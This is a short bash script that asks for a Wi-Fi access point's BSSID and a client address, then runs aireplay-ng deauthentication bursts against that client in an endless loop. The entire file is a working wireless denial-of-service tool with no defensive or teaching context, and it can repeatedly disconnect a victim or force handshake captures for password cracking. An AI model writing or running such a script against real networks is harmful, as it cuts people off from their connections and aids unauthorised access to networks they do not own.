#!/bin/bash
echo Enter bssid:
read -p '> ' 'bssid'

echo Enter a client
read -p '> ' 'client'

while true
do 
    aireplay-ng wlan0mon -0 5 -a $bssid -c $client
    sleep 5
    echo 'waiting...!!!'

done
